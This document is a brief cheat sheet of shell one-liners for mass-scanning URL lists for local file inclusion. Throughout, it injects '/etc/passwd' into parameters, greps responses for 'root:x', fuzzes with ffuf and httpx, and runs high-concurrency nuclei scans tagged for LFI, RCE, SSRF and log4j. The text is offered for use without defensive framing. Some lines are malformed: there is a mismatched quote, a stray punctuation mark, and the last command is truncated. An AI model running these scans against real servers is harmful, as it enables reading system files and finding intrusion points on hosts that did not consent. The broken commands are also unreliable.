# cat lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"’
for URL in $(cat urls.txt); do (ffuf -u "${URL}" -c -w lfi_wordlist.txt -mc 200 -ac -sa -t 20 -or -od ffuf_lfi_results); done
grep -Ril "root:x" ffuf_lfi_results/ | tee LFI_VULNERABLE.txt
cat LFI_VULNERABLE.txt >> lfi_bugs.txt
rm LFI_VULNERABLE.txt ffuf_lfi_results
httpx -l lfi.txt -paths lfi_wordlist.txt -threads 100 -random-agent. -mc 200 -mr “root:[x*]:0:0:”
nuclei -l urls.txt -c 200 -tags lfi
nuclei -l urls.txt -c 200 -t fuzzing-templates -s critical,high
nuclei -c 500 -l urls.txt -t ~/nuclei-templates/ -severity critical,high -ept ssl,tcp -tags cve,rce,log4j,grafana,tomcat,solar,apache,lfi,ssrf,s>






